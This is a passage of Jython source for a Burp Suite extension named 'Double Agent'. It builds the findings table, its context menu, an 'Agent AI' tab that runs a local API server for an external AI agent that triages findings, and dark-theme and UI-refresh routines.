        self.findingsTable.getSelectionModel().addListSelectionListener(FindingsSelectionListener(self))

        # Double-click sends to Repeater
        from java.awt.event import MouseAdapter
        class FindingsMouseListener(MouseAdapter):
            def __init__(self, extender):
                self.extender = extender

            def mouseClicked(self, e):
                if e.getClickCount() == 2:
                    table = e.getSource()
                    row = table.getSelectedRow()
                    if row >= 0:
                        model_row = table.convertRowIndexToModel(row)
                        url = table.getModel().getValueAt(model_row, 1)  # URL is col 1
                        self.extender._navigate_to_url(str(url))

            def mousePressed(self, e):
                self._maybeShowPopup(e)

            def mouseReleased(self, e):
                self._maybeShowPopup(e)

            def _maybeShowPopup(self, e):
                if e.isPopupTrigger():
                    table = e.getSource()
                    row = table.rowAtPoint(e.getPoint())
                    # Only change selection if clicked row is not already in selection
                    if row >= 0 and not table.isRowSelected(row):
                        # Clear previous selection and select only this row
                        table.clearSelection()
                        table.setRowSelectionInterval(row, row)
                    # If clicked row IS selected, preserve existing multi-selection
                    self.extender.findingsPopupMenu.show(e.getComponent(), e.getX(), e.getY())

        self.findingsTable.addMouseListener(FindingsMouseListener(self))

        # Right-click context menu on findings table
        from javax.swing.event import PopupMenuListener as _PML
        self.findingsPopupMenu = JPopupMenu()
        copyUrlItem = JMenuItem("Copy URL")
        copyTitleItem = JMenuItem("Copy Finding Title")
        sendToRepeaterItem = JMenuItem("Send to Repeater")
        sendToAgentItem = JMenuItem("Send to Agent")
        reproduceItem = JMenuItem("Reproduce (ask agent to send via Burp)")
        markFPItem = JMenuItem("Mark as False Positive")
        unmarkFPItem = JMenuItem("Unmark False Positive")
        self._deleteSelectedItem = JMenuItem("Delete Selected")
        exportItem = JMenuItem("Export to CSV")

        severityMenu = JMenu("Set Severity")
        for _sev in ["Critical", "High", "Medium", "Low", "Information"]:
            _sevItem = JMenuItem(_sev)
            _sevItem.addActionListener(lambda e, s=_sev: self._setSeverity(s))
            severityMenu.add(_sevItem)

        copyUrlItem.addActionListener(lambda e: self._copyFindingField(1))
        copyTitleItem.addActionListener(lambda e: self._copyFindingField(2))
        sendToRepeaterItem.addActionListener(lambda e: self._sendFindingToRepeater())
        sendToAgentItem.addActionListener(lambda e: self._sendFindingsToAgent())
        reproduceItem.addActionListener(lambda e: self._reproduceFinding())
        markFPItem.addActionListener(lambda e: self._markAsFP())
        unmarkFPItem.addActionListener(lambda e: self._unmarkAsFP())
        self._deleteSelectedItem.addActionListener(lambda e: self._deleteSelected())
        exportItem.addActionListener(lambda e: self._exportSelectedCSV())

        self.findingsPopupMenu.add(copyUrlItem)
        self.findingsPopupMenu.add(copyTitleItem)
        self.findingsPopupMenu.addSeparator()
        self.findingsPopupMenu.add(sendToRepeaterItem)
        self.findingsPopupMenu.add(sendToAgentItem)
        self.findingsPopupMenu.add(reproduceItem)
        self.findingsPopupMenu.addSeparator()
        self.findingsPopupMenu.add(markFPItem)
        self.findingsPopupMenu.add(unmarkFPItem)
        self.findingsPopupMenu.addSeparator()
        self.findingsPopupMenu.add(severityMenu)
        self.findingsPopupMenu.addSeparator()
        self.findingsPopupMenu.add(self._deleteSelectedItem)
        self.findingsPopupMenu.addSeparator()
        self.findingsPopupMenu.add(exportItem)

        class _FindingsPopupListener(_PML):
            def __init__(self_l, ext):
                self_l.ext = ext
            def popupMenuWillBecomeVisible(self_l, e):
                try:
                    n = len(self_l.ext.findingsTable.getSelectedRows())
                    self_l.ext._deleteSelectedItem.setText(
                        "Delete Selected (%d)" % n if n > 0 else "Delete Selected")
                except:
                    pass
            def popupMenuWillBecomeInvisible(self_l, e):
                pass
            def popupMenuCanceled(self_l, e):
                pass
        self.findingsPopupMenu.addPopupMenuListener(_FindingsPopupListener(self))

        findingsScrollPane = JScrollPane(self.findingsTable)

        # Findings detail panel (#1): shows description/evidence/CWE when a finding is selected
        self.findingDetailText = JTextArea()
        self.findingDetailText.setEditable(False)
        self.findingDetailText.setFont(Font("Monospaced", Font.PLAIN, 12))
        self.findingDetailText.setLineWrap(True)
        self.findingDetailText.setWrapStyleWord(True)
        self.findingDetailText.setText("Select a finding to view details.")
        findingDetailScroll = JScrollPane(self.findingDetailText)
        findingDetailScroll.setBorder(BorderFactory.createTitledBorder("Finding Details"))

        findingsSplitPane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        findingsSplitPane.setResizeWeight(0.65)
        findingsSplitPane.setTopComponent(findingsScrollPane)
        findingsSplitPane.setBottomComponent(findingDetailScroll)
        self.findingsSplitPane = findingsSplitPane

        findingsPanel.add(findingsSplitPane, BorderLayout.CENTER)
        self.workspaceTabs.addTab("Findings (0)", findingsPanel)
        self._findingsTabIndex = self.workspaceTabs.getTabCount() - 1

        # ===== AGENT AI TAB =====
        agentPanel = JPanel(BorderLayout())

        # Top: server controls
        agentServerPanel = JPanel(FlowLayout(FlowLayout.LEFT))
        agentServerPanel.setBorder(BorderFactory.createTitledBorder("Agent API Server"))

        self.agentServerStatusLabel = JLabel("Status: Stopped")
        self.agentServerStatusLabel.setFont(Font("Monospaced", Font.BOLD, 11))
        agentServerPanel.add(self.agentServerStatusLabel)

        agentServerPanel.add(JLabel("  Port:"))
        self.agentPortField = JTextField(str(self.agent_server_port), 6)
        agentServerPanel.add(self.agentPortField)

        self.agentStartBtn = JButton("Start Server")
        def _startAgent(e):
            try:
                p = int(self.agentPortField.getText().strip())
                self.agent_server_port = p
            except:
                pass
            self.start_agent_server()
            self._ui_dirty = True
            self.refreshUI()
        self.agentStartBtn.addActionListener(_startAgent)
        agentServerPanel.add(self.agentStartBtn)

        self.agentStopBtn = JButton("Stop Server")
        def _stopAgent(e):
            self.stop_agent_server()
            self._ui_dirty = True
            self.refreshUI()
        self.agentStopBtn.addActionListener(_stopAgent)
        agentServerPanel.add(self.agentStopBtn)

        self.agentCopyEndpointBtn = JButton("Copy Agent Prompt")
        self.agentCopyEndpointBtn.setToolTipText("Copy the browser-capable agent prompt.")
        self.agentCopyEndpointBtn.addActionListener(lambda e: self._copy_agent_bootstrap_prompt(True, self.agentCopyEndpointBtn))
        agentServerPanel.add(self.agentCopyEndpointBtn)

        self.agentCopySshPromptBtn = JButton("Copy SSH Prompt")
        self.agentCopySshPromptBtn.setToolTipText("Copy a headless SSH prompt with browser instructions removed.")
        self.agentCopySshPromptBtn.addActionListener(lambda e: self._copy_agent_bootstrap_prompt(False, self.agentCopySshPromptBtn))
        agentServerPanel.add(self.agentCopySshPromptBtn)

        agentPanel.add(agentServerPanel, BorderLayout.NORTH)

        # Middle: queue selector + stats
        agentQueuePanel = JPanel(FlowLayout(FlowLayout.LEFT))
        agentQueuePanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5))

        agentQueuePanel.add(JLabel("Work Items:"))
        self.agentHistoryCombo = JComboBox()
        self.agentHistoryCombo.setFont(Font("Monospaced", Font.PLAIN, 11))
        self.agentHistoryCombo.setPreferredSize(Dimension(400, 25))
        self._agent_combo_updating = False

        def onAgentComboSelected(e):
            if self._agent_combo_updating:
                return
            idx = self.agentHistoryCombo.getSelectedIndex()
            if idx >= 0:
                self.selected_agent_queue_index = idx
                self.updateAgentAssessmentDetails(idx)

        self.agentHistoryCombo.addActionListener(onAgentComboSelected)
        agentQueuePanel.add(self.agentHistoryCombo)

        self.agentStatsLabel = JLabel("Pending: 0 | Claimed: 0 | Completed: 0")
        self.agentStatsLabel.setFont(Font("Monospaced", Font.BOLD, 11))
        agentQueuePanel.add(self.agentStatsLabel)

        agentQueuePanel.add(JLabel("  "))
        self.agentClearBtn = JButton("Clear Queue")
        def _clearQueue(e):
            try:
                with self.agent_queue_lock:
                    count = len(self.agent_queue)
                    self.agent_queue = []
                    self.agent_queue_next_id = 0
                    self.selected_agent_queue_index = -1
                self.save_agent_queue()
                self.log_to_console("[AGENT] Queue cleared (%d items removed)" % count)
                self._ui_dirty = True
                self.refreshUI()
                self.agentAssessmentText.setText(
                    "Queue cleared.\n\n"
                    "New work items can be added by right-clicking HTTP requests in Burp and selecting:\n"
                    "  Double Agent > Active Scan with Agent\n"
                    "  Double Agent > Analyze Flow (for multi-step flows)\n"
                )
            except Exception as ex:
                self.stderr.println("[AGENT] Clear queue error: %s" % self._safe_ascii_text(ex))
        self.agentClearBtn.addActionListener(_clearQueue)
        agentQueuePanel.add(self.agentClearBtn)

        self.agentPositiveObsBtn = JButton("Effective Practices")
        self.agentPositiveObsBtn.setToolTipText("Queue an agent task to produce concise effective security practices for the final report.")
        self.agentPositiveObsBtn.addActionListener(lambda e: self._queueEffectiveSecurityPractices())
        agentQueuePanel.add(self.agentPositiveObsBtn)

        # Import WebSocket button (since context menu doesn't work in WebSockets history)
        self.agentImportWsBtn = JButton("Import WebSocket")
        def _importWs(e):
            self._showWebSocketImportDialog()
        self.agentImportWsBtn.addActionListener(_importWs)
        agentQueuePanel.add(self.agentImportWsBtn)

        # Combine server panel + queue panel into one north panel
        agentNorth = JPanel(BorderLayout())
        agentNorth.add(agentServerPanel, BorderLayout.NORTH)
        agentNorth.add(agentQueuePanel, BorderLayout.SOUTH)
        agentPanel.removeAll()
        agentPanel.setLayout(BorderLayout())
        agentPanel.add(agentNorth, BorderLayout.NORTH)

        # Center: work item details + token panel
        centerPanel = JPanel(BorderLayout())

        # Token display panel (fixed height, sits at top)
        agentTokenPanel = JPanel(FlowLayout(FlowLayout.LEFT))
        agentTokenPanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5))
        agentTokenPanel.add(JLabel("Double Agent API Token:"))
        self.agentTokenField = JTextField("(not set)", 50)
        self.agentTokenField.setFont(Font("Monospaced", Font.BOLD, 11))
        self.agentTokenField.setForeground(Color(0x80, 0x80, 0x80))
        self.agentTokenField.setEditable(False)
        self.agentTokenField.setBackground(None)
        self.agentTokenField.setBorder(None)
        agentTokenPanel.add(self.agentTokenField)

        self.agentCopyTokenBtn = JButton("Copy")
        self.agentCopyTokenBtn.setToolTipText("Copy 'Double Agent API Token: <token>' to clipboard")
        self.agentCopyTokenBtn.addActionListener(lambda e: self._copyDoubleAgentApiToken())
        agentTokenPanel.add(self.agentCopyTokenBtn)

        centerPanel.add(agentTokenPanel, BorderLayout.NORTH)

        # Assessment text area fills remaining space and is scrollable
        self.agentAssessmentText = JTextArea()
        self.agentAssessmentText.setEditable(False)
        self.agentAssessmentText.setFont(Font("Monospaced", Font.PLAIN, 12))
        self.agentAssessmentText.setLineWrap(True)
        self.agentAssessmentText.setWrapStyleWord(True)
        self.agentAssessmentText.setText(
            "Agent AI integration\n"
            "---------------------\n"
            "1. Click 'Start Server' above to expose the local API on port 8777.\n"
            "2. Click 'Copy Agent Prompt' for desktop/browser workflows, or 'Copy SSH Prompt' for headless SSH environments.\n"
            "   (Or use the 'Copy' button next to the token to share just the token line.)\n"
            "3. The agent calls GET /api/findings to triage automatically. You don't have to push work.\n"
            "4. To explicitly queue work: select findings -> right-click -> 'Send to Agent',\n"
            "   or right-click HTTP requests -> 'Double Agent' -> Passive/Active/Analyze Flow.\n"
            "5. The agent claims work items, runs manual tests, and posts evidence back via the API.\n"
            "6. Live findings markdown is available at GET /api/report.\n"
            "7. If the agent forgets API details, it can always re-fetch GET /api/docs.\n"
        )
        centerPanel.add(JScrollPane(self.agentAssessmentText), BorderLayout.CENTER)

        agentPanel.add(centerPanel, BorderLayout.CENTER)

        self.workspaceTabs.addTab("Agent AI", agentPanel)
        self._agentTabIndex = self.workspaceTabs.getTabCount() - 1

        self.reportIncludeFP = None
        self.reportIncludeDeferred = None
        self.reportTextArea = None

        # Log tab switching performance while debugging UI pauses.
        def _onTabChange(e):
            start = time.time()
            try:
                selected_idx = self.workspaceTabs.getSelectedIndex()
                try:
                    selected_title = self.workspaceTabs.getTitleAt(selected_idx)
                except:
                    selected_title = "unknown"
                self._last_tab_switch_started_at = start
                self.stdout.println("[UI PERF] Tab switch -> %s" % selected_title)
                elapsed_ms = int((time.time() - start) * 1000)
                if elapsed_ms > 250:
                    self.stdout.println("[UI PERF] Tab switch handler slow: %dms -> %s" % (elapsed_ms, selected_title))
            except Exception as ex:
                try:
                    self.stderr.println("[UI PERF] Tab switch handler error: %s" % self._safe_ascii_text(ex))
                except:
                    pass
        self.workspaceTabs.addChangeListener(_onTabChange)

        self.panel.add(self.workspaceTabs, BorderLayout.CENTER)

        # Console Panel (shown in popup dialog via checkbox)
        consolePanel = JPanel(BorderLayout())
        consolePanel.setBorder(BorderFactory.createTitledBorder("Console"))

        self.consoleTextArea = JTextArea()
        self.consoleTextArea.setEditable(False)
        self.consoleTextArea.setFont(Font("Monospaced", Font.PLAIN, 13))
        self.consoleTextArea.setLineWrap(True)
        self.consoleTextArea.setWrapStyleWord(False)
        self.applyConsoleTheme()

        consoleScrollPane = JScrollPane(self.consoleTextArea)
        consoleScrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_ALWAYS)

        self.console_user_scrolled = False

        from java.awt.event import AdjustmentListener
        class ScrollListener(AdjustmentListener):
            def __init__(self, extender):
                self.extender = extender
                self.last_value = 0

            def adjustmentValueChanged(self, e):
                scrollbar = e.getAdjustable()
                current_value = scrollbar.getValue()
                max_value = scrollbar.getMaximum() - scrollbar.getVisibleAmount()
                if current_value < max_value - 10:
                    self.extender.console_user_scrolled = True
                else:
                    self.extender.console_user_scrolled = False

        consoleScrollPane.getVerticalScrollBar().addAdjustmentListener(ScrollListener(self))
        consolePanel.add(consoleScrollPane, BorderLayout.CENTER)

        from javax.swing import JDialog, WindowConstants
        from java.awt.event import WindowAdapter

        self.consoleDialog = JDialog()
        self.consoleDialog.setTitle("Console")
        self.consoleDialog.setModal(False)
        self.consoleDialog.setSize(1000, 320)
        self.consoleDialog.setLocationRelativeTo(self.panel)
        self.consoleDialog.setDefaultCloseOperation(WindowConstants.HIDE_ON_CLOSE)
        self.consoleDialog.add(consolePanel)

        class ConsoleWindowListener(WindowAdapter):
            def __init__(self, extender):
                self.extender = extender
            def windowClosing(self, e):
                try:
                    if hasattr(self.extender, "consoleWindowCheck") and self.extender.consoleWindowCheck is not None:
                        self.extender.consoleWindowCheck.setSelected(False)
                except:
                    pass

        self.consoleDialog.addWindowListener(ConsoleWindowListener(self))
        self._apply_dark_theme_to_container(self.consoleDialog)
        self.consoleDialog.setVisible(False)

        # Restore persisted column widths (#5)
        self._restore_column_widths()

        self.apply_hacker_ui_theme()

    def toggleConsoleWindow(self, event=None):
        if not hasattr(self, "consoleDialog") or self.consoleDialog is None:
            return

        show_console = False
        try:
            if hasattr(self, "consoleWindowCheck") and self.consoleWindowCheck is not None:
                show_console = bool(self.consoleWindowCheck.isSelected())
        except:
            show_console = False

        try:
            if show_console:
                self.consoleDialog.setLocationRelativeTo(self.panel)
                self.consoleDialog.setVisible(True)
                self.consoleDialog.toFront()
                self.consoleDialog.requestFocus()
            else:
                self.consoleDialog.setVisible(False)
        except Exception as e:
            self.stderr.println("[UI] Failed to toggle console window: %s" % self._safe_ascii_text(e))

    def _detect_burp_theme(self):
        """Detect whether Burp Suite is running a dark or light theme."""
        try:
            bg = UIManager.getColor("Panel.background")
            if bg is not None:
                luminance = (bg.getRed() * 299 + bg.getGreen() * 587 + bg.getBlue() * 114) / 1000
                return "Dark" if luminance < 128 else "Light"
        except:
            pass
        return "Dark"

    def _resolved_theme(self):
        """Return 'Dark' or 'Light' based on current theme setting."""
        if self.THEME == "Auto":
            return self._detect_burp_theme()
        return self.THEME

    def _style_all_tab_panes(self):
        """Apply tab title colors using custom JLabel tab components.
        setForegroundAt is ignored by Burp's L&F, so we must use setTabComponentAt."""
        from javax.swing import JLabel
        dark = self._resolved_theme() == "Dark"
        fg = Color.WHITE if dark else Color(0x33, 0x33, 0x33)
        for tab_name in ("workspaceTabs",):
            tabbed = getattr(self, tab_name, None)
            if tabbed is None:
                continue
            for i in range(tabbed.getTabCount()):
                title = tabbed.getTitleAt(i)
                lbl = tabbed.getTabComponentAt(i)
                if lbl is None or not isinstance(lbl, JLabel):
                    lbl = JLabel(title)
                    lbl.setFont(Font("Monospaced", Font.BOLD, 11))
                    lbl.setOpaque(False)
                    tabbed.setTabComponentAt(i, lbl)
                else:
                    lbl.setText(title)
                lbl.setForeground(fg)

    def apply_hacker_ui_theme(self):
        resolved = self._resolved_theme()
        self._style_all_tab_panes()
        if resolved != "Dark":
            return
        bg_root = Color(0x08, 0x0C, 0x10)
        bg_panel = Color(0x12, 0x20, 0x30)
        bg_surface = Color(0x1A, 0x2F, 0x42)
        bg_input = Color(0x0C, 0x18, 0x26)
        fg_primary = Color(0xD5, 0xF9, 0xEA)
        fg_muted = Color(0x86, 0xA8, 0x9A)
        fg_accent = Color(0x00, 0xF5, 0xA0)
        fg_info = Color(0x59, 0xE1, 0xFF)
        border_color = Color(0x2D, 0x4F, 0x6E)
        selection_bg = Color(0x00, 0x6A, 0x4E)

        mono_regular = Font("Monospaced", Font.PLAIN, 12)
        mono_bold = Font("Monospaced", Font.BOLD, 12)

        def _style_tab_pane(tabbed):
            """Style tab headers using native Swing APIs — no custom JLabel components."""
            try:
                if tabbed is None:
                    return
                tabbed.setBackground(bg_panel)
                tabbed.setForeground(Color.WHITE)
                tabbed.setFont(Font("Monospaced", Font.BOLD, 11))

                def _apply_tab_colors():
                    selected_index = tabbed.getSelectedIndex()
                    for i in range(tabbed.getTabCount()):
                        tabbed.setForegroundAt(i, Color.WHITE)
                        if i == selected_index:
                            tabbed.setBackgroundAt(i, Color(0x1E, 0x3D, 0x55))
                        else:
                            tabbed.setBackgroundAt(i, Color(0x14, 0x2A, 0x3C))

                _apply_tab_colors()

                if tabbed.getClientProperty("double_agent_tab_color_listener") is None:
                    class TabColorSyncListener(ChangeListener):
                        def stateChanged(self_inner, e):
                            _apply_tab_colors()

                    tabbed.addChangeListener(TabColorSyncListener())
                    tabbed.putClientProperty("double_agent_tab_color_listener", True)
            except:
                pass

        def _style_component(comp):
            try:
                if isinstance(comp, JPanel):
                    comp.setBackground(bg_panel)
                    border = comp.getBorder()
                    if isinstance(border, TitledBorder):
                        border.setTitleColor(fg_accent)
                        border.setBorder(BorderFactory.createLineBorder(border_color, 1))

                if isinstance(comp, JLabel):
                    text = self._safe_ascii_text(comp.getText() or "")
                    comp.setForeground(Color.WHITE)
                    comp.setBackground(bg_panel)
                    comp.setOpaque(False)
                    if "Double Agent" in text:
                        comp.setForeground(fg_accent)
                        comp.setFont(Font("Monospaced", Font.BOLD, 17))
                    elif "AI-Powered" in text:
                        comp.setForeground(fg_info)
                    elif "Total:" in text and "Crit:" in text:
                        comp.setForeground(fg_info)
                        comp.setFont(Font("Monospaced", Font.BOLD, 11))

                if isinstance(comp, JButton):
                    comp.setBackground(bg_surface)
                    comp.setForeground(fg_accent)
                    comp.setBorder(BorderFactory.createLineBorder(border_color, 1))
                    comp.setFont(mono_bold)
                    comp.setOpaque(True)
                    try:
                        comp.setFocusPainted(False)
                    except:
                        pass

                if isinstance(comp, JCheckBox):
                    comp.setBackground(bg_panel)
                    comp.setForeground(Color.WHITE)
                    comp.setFont(mono_regular)
                    comp.setOpaque(False)

                if isinstance(comp, JTextArea):
                    if comp is getattr(self, "consoleTextArea", None):
                        comp.setBackground(bg_input)
                        comp.setForeground(Color(0x7A, 0xF7, 0xBE))
                    else:
                        comp.setBackground(bg_input)
                        comp.setForeground(Color.WHITE)
                    comp.setCaretColor(fg_accent)
                    comp.setSelectionColor(Color(0x1B, 0x3A, 0x2D))
                    comp.setSelectedTextColor(Color.WHITE)
                    comp.setFont(mono_regular)

                if isinstance(comp, JTable):
                    comp.setBackground(bg_input)
                    comp.setForeground(fg_primary)
                    comp.setGridColor(border_color)
                    comp.setSelectionBackground(selection_bg)
                    comp.setSelectionForeground(Color.WHITE)
                    comp.setFont(mono_regular)
                    header = comp.getTableHeader()
                    if header is not None:
                        header.setBackground(bg_surface)
                        header.setForeground(fg_accent)
                        header.setFont(mono_bold)
                        header.setDefaultRenderer(ThemeAwareHeaderRenderer(self))

                if isinstance(comp, JScrollPane):
                    comp.setBorder(BorderFactory.createLineBorder(border_color, 1))
                    viewport = comp.getViewport()
                    if viewport is not None and viewport.getView() is not None:
                        try:
                            viewport.getView().setBackground(bg_input)
                        except:
                            pass

                if isinstance(comp, JSplitPane):
                    comp.setBackground(bg_root)
                    comp.setBorder(BorderFactory.createEmptyBorder())

                if hasattr(comp, "getComponents"):
                    children = comp.getComponents()
                    if children:
                        for child in children:
                            _style_component(child)
            except:
                pass

        try:
            self.panel.setBackground(bg_root)
            _style_component(self.panel)

            # Explicitly theme tables and their scroll pane viewports
            # The recursive walk may not fully reach viewport backgrounds
            for table in (self.taskTable, self.findingsTable):
                try:
                    table.setBackground(bg_input)
                    table.setForeground(fg_primary)
                    table.setGridColor(border_color)
                    table.setSelectionBackground(selection_bg)
                    table.setSelectionForeground(Color.WHITE)
                    parent = table.getParent()
                    if parent is not None:
                        parent.setBackground(bg_input)  # viewport
                except:
                    pass

            # Theme popup menu
            try:
                self.findingsPopupMenu.setBackground(bg_surface)
                self.findingsPopupMenu.setBorder(BorderFactory.createLineBorder(border_color, 1))
                for i in range(self.findingsPopupMenu.getComponentCount()):
                    item = self.findingsPopupMenu.getComponent(i)
                    if isinstance(item, JMenu):
                        item.setBackground(bg_surface)
                        item.setForeground(fg_primary)
                        item.setFont(mono_regular)
                        item.setOpaque(True)
                        sub = item.getPopupMenu()
                        if sub is not None:
                            sub.setBackground(bg_surface)
                            sub.setBorder(BorderFactory.createLineBorder(border_color, 1))
                            for j in range(sub.getComponentCount()):
                                sub_item = sub.getComponent(j)
                                if isinstance(sub_item, JMenuItem):
                                    sub_item.setBackground(bg_surface)
                                    sub_item.setForeground(fg_primary)
                                    sub_item.setFont(mono_regular)
                                    sub_item.setOpaque(True)
            except:
                pass

            # Theme Agent tab components
            try:
                self.agentHistoryCombo.setBackground(bg_input)
                self.agentHistoryCombo.setForeground(fg_primary)
                self.agentStatsLabel.setForeground(fg_primary)
                self.agentAssessmentText.setBackground(bg_input)
                self.agentAssessmentText.setForeground(fg_primary)
                self.agentServerStatusLabel.setForeground(fg_primary)
                self.agentPortField.setBackground(bg_input)
                self.agentPortField.setForeground(fg_primary)
                self.agentPortField.setCaretColor(fg_accent)
            except:
                pass

            # Theme finding detail text area
            try:
                self.findingDetailText.setBackground(bg_input)
                self.findingDetailText.setForeground(Color.WHITE)
                self.findingDetailText.setCaretColor(fg_accent)
            except:
                pass


            self.panel.revalidate()
            self.panel.repaint()
        except:
            pass

        try:
            for tab_name in ("workspaceTabs",):
                tabbed = getattr(self, tab_name, None)
                if tabbed is not None:
                    tabbed.setBackground(bg_panel)
                    _style_tab_pane(tabbed)
        except:
            pass

    def applyConsoleTheme(self):
        """Apply theme colors to console"""
        resolved = self._resolved_theme()
        if resolved == "Dark":
            self.consoleTextArea.setBackground(Color(0x0C, 0x18, 0x26))
            self.consoleTextArea.setForeground(Color(0x7A, 0xF7, 0xBE))
        else:
            self.consoleTextArea.setBackground(Color.WHITE)
            self.consoleTextArea.setForeground(Color(0x36, 0x45, 0x4F))

    def _apply_dark_theme_to_container(self, container):
        """Apply dark theme colors to any component tree (dialogs, panels, etc.)."""
        if self._resolved_theme() != "Dark":
            return
        bg_panel = Color(0x12, 0x20, 0x30)
        bg_input = Color(0x0C, 0x18, 0x26)
        fg_primary = Color(0xD5, 0xF9, 0xEA)
        border_color = Color(0x2D, 0x4F, 0x6E)

        def _walk(comp):
            try:
                if isinstance(comp, JPanel):
                    comp.setBackground(bg_panel)
                if isinstance(comp, JLabel):
                    comp.setForeground(Color.WHITE)
                if isinstance(comp, JButton):
                    comp.setBackground(Color(0x1A, 0x2F, 0x42))
                    comp.setForeground(Color(0x00, 0xF5, 0xA0))
                    comp.setBorder(BorderFactory.createLineBorder(border_color, 1))
                    comp.setOpaque(True)
                if isinstance(comp, JTextArea):
                    comp.setBackground(bg_input)
                    comp.setForeground(Color.WHITE)
                    comp.setCaretColor(Color(0x00, 0xF5, 0xA0))
                if isinstance(comp, JCheckBox):
                    comp.setBackground(bg_panel)
                    comp.setForeground(Color.WHITE)
                    comp.setOpaque(False)
                if isinstance(comp, JScrollPane):
                    comp.setBorder(BorderFactory.createLineBorder(border_color, 1))
                    viewport = comp.getViewport()
                    if viewport and viewport.getView():
                        try:
                            viewport.getView().setBackground(bg_input)
                        except:
                            pass
                # Handle JTextField, JPasswordField via duck typing (has getColumns)
                if hasattr(comp, "setBackground") and hasattr(comp, "getColumns") and not isinstance(comp, JTextArea):
                    comp.setBackground(bg_input)
                    comp.setForeground(fg_primary)
                    try:
                        comp.setCaretColor(Color(0x00, 0xF5, 0xA0))
                    except:
                        pass
                # Handle JComboBox via duck typing (has getItemCount)
                if hasattr(comp, "getItemCount") and hasattr(comp, "getSelectedItem"):
                    comp.setBackground(bg_input)
                    comp.setForeground(fg_primary)
                # Handle JTabbedPane
                if hasattr(comp, "getTabCount") and hasattr(comp, "setTabComponentAt"):
                    comp.setBackground(bg_panel)
                    comp.setForeground(Color.WHITE)
                if hasattr(comp, "getComponents"):
                    for child in (comp.getComponents() or []):
                        _walk(child)
            except:
                pass

        try:
            if hasattr(container, "getContentPane"):
                container.getContentPane().setBackground(bg_panel)
                _walk(container.getContentPane())
            else:
                _walk(container)
        except:
            pass

    def refreshUI(self, event=None):
        # Skip if a refresh is already queued on the EDT
        if self._refresh_pending:
            queued_at = float(getattr(self, "_last_ui_refresh_queued_at", 0) or 0)
            pending_ms = int((time.time() - queued_at) * 1000) if queued_at else 0
            if pending_ms > 1000:
                self._perf_debug(
                    "refresh skip: EDT refresh already pending for %dms | %s" % (
                        pending_ms, self._perf_counts_snapshot()),
                    key="refresh-pending", min_interval=2.0)
            return
        # Skip if nothing changed since last refresh
        if not self._ui_dirty:
            return

        def _activity_task_visible(task):
            status = str(task.get("status", ""))
            task_type = str(task.get("type", ""))
            url = str(task.get("url", ""))
            if "OPTIONS Request" in status:
                return False
            if "Skipped" in status:
                return False
            if task_type == "PROXY" and "Completed" in status:
                return False
            if self.should_skip_extension(url):
                return False
            return True

        class RefreshRunnable(Runnable):
            def __init__(self, extender):
                self.extender = extender

            def run(self):
                queued_at = float(getattr(self.extender, "_last_ui_refresh_queued_at", 0) or 0)
                queue_lag_ms = int((time.time() - queued_at) * 1000) if queued_at else 0
                refresh_start = time.time()
                self.extender._last_ui_refresh_started_at = refresh_start
                timings = []
                try:
                    # --- Copy data out of locks (fast) ---
                    phase_start = time.time()
                    with self.extender.tasks_lock:
                        tasks_snapshot = []
                        for task in self.extender.tasks[-1000:]:
                            if not _activity_task_visible(task):
                                continue
                            status = str(task.get("status", ""))
                            duration = ""
                            if task.get("end_time"):
                                duration = "%.2fs" % (task["end_time"] - task["start_time"])
                            elif task.get("start_time"):
                                duration = "%.2fs" % (time.time() - task["start_time"])
                            tasks_snapshot.append([
                                task.get("timestamp", ""),
                                task.get("type", ""),
                                task.get("url", ""),
                                status,
                                duration
                            ])
                        activity_signature = tuple(
                            (row[0], row[1], row[2], row[3], row[4])
                            for row in tasks_snapshot
                        )
                    activity_snapshot_count = len(tasks_snapshot)
                    timings.append(("activity snapshot", int((time.time() - phase_start) * 1000)))

                    phase_start = time.time()
                    with self.extender.findings_lock_ui:
                        findings_snapshot = []
                        severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Information": 0}
                        total_findings = 0
                        hidden_count = 0
                        for fid, finding in enumerate(self.extender.findings_list):
                            is_hidden = self.extender._finding_hidden_from_normal_view(finding)
                            severity = finding.get("severity", "Information")
                            if is_hidden:
                                hidden_count += 1
                            else:
                                total_findings += 1
                                if severity in severity_counts:
                                    severity_counts[severity] += 1
                            # Display 1-based finding IDs in the # column
                            # (internal Python list index stays 0-based).
                            findings_snapshot.append([
                                fid + 1,
                                finding.get("url", ""),
                                finding.get("title", ""),
                                severity,
                                finding.get("confidence", ""),
                                finding.get("agent_status", "untouched"),
                                finding.get("agent_priority", "")
                            ])
                        findings_signature = tuple(
                            (row[0], row[1], row[2], row[3], row[4], row[5], row[6])
                            for row in findings_snapshot
                        )
                    findings_snapshot_count = len(findings_snapshot)
                    timings.append(("findings snapshot", int((time.time() - phase_start) * 1000)))

                    phase_start = time.time()
                    with self.extender.console_lock:
                        current_len = len(self.extender.console_messages)
                        prev_len = self.extender._last_console_len
                        if current_len != prev_len:
                            new_messages = list(self.extender.console_messages[prev_len:])
                            console_changed = True
                        else:
                            new_messages = []
                            console_changed = False
                        # Handle case where messages were trimmed (list shortened)
                        if current_len < prev_len:
                            console_changed = True
                            new_messages = list(self.extender.console_messages)
                            prev_len = 0
                    console_new_count = len(new_messages)
                    timings.append(("console snapshot", int((time.time() - phase_start) * 1000)))

                    # --- Update Swing components (no locks held) ---

                    phase_start = time.time()
                    activity_changed = activity_signature != getattr(self.extender, "_last_activity_sig", None)
                    if activity_changed:
                        self.extender.taskTableModel.setRowCount(0)
                        for row in tasks_snapshot:
                            self.extender.taskTableModel.addRow(row)
                        self.extender._last_activity_sig = activity_signature
                    try:
                        tab_idx = getattr(self.extender, "_activityTabIndex", 0)
                        title = "Activity"
                        active_count = 0
                        for row in tasks_snapshot:
                            if not self.extender._is_terminal_status(str(row[3])):
                                active_count += 1
                        if active_count > 0:
                            title = "Activity (%d)" % active_count
                        if self.extender.workspaceTabs.getTitleAt(tab_idx) != title:
                            self.extender.workspaceTabs.setTitleAt(tab_idx, title)
                            self.extender._style_all_tab_panes()
                    except:
                        pass
                    timings.append(("activity table", int((time.time() - phase_start) * 1000)))

                    # Findings table — preserve selection across rebuild
                    phase_start = time.time()
                    findings_changed = findings_signature != getattr(self.extender, "_last_findings_sig", None)
                    if findings_changed:
                        selected_finding_id = None
                        sel_row = self.extender.findingsTable.getSelectedRow()
                        if sel_row >= 0:
                            try:
